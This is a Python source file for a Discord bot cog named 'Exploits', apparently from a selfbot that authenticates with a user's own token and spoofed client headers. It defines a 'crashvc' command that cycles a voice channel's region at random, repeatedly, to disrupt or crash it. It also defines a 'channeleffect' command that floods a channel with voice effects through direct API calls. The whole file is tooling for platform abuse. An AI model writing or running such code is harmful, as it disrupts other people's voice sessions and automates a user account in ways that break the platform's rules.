import discord, requests, random
from discord.ext import commands

from src.session import client
from src.console.output import output
from src.discord_utils import discord_utils


class Exploits(commands.Cog):
	"""Contains commands that are used to exploit some of Discord's aspects"""

	def __init__(self, bot):
		self.bot = bot


	@commands.command(name="crashvc", aliases=["crashvoicechannel"], description="Crashes a voice channel", usage="crashvc <channel_id> <amount>")
	async def crashvc(self, ctx, channel_id: str, amount:int = 1):

		output.log("Attempting to crash the voice channel ")
		regions = [
			'hongkong',
			'india',
			'russia',
			'brazil',
			'japan',
			'singapore',
			'southafrica',
			'sydney',
			'us-central',
			'us-east',
			'us-west',
			'us-south'
		]

		for channel in ctx.guild.channels:
			if str(channel.id) == channel_id:
				for x in range(amount):
					region = random.choice(regions)
					try:
						await channel.edit(rtc_region=region)
					except:
						pass


	@commands.command(name="channeleffect", aliases=["channeleffects"], description="Applies a channel effect to a channel", usage="channeleffect <channel_id> (amount) (emoji)")
	async def channeleffect(self, ctx, channel_id: str, amount: int=1,emoji: str = "üëç"):

		x_super_properties = discord_utils.get_x_super_properties()

		headers = {
			"Authorization": client.token,
			"Content-Type": "application/json",
			"x-super-properties": x_super_properties
		}

		payload = {
			"animation_id": 6,
			"animation_type": 1,
			"emoji_id": None,
			"emoji_name": emoji
		}

		for _ in range(amount):
			r = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/voice-channel-effects", headers=headers, json=payload)



def setup(bot):
	bot.add_cog(Exploits(bot))
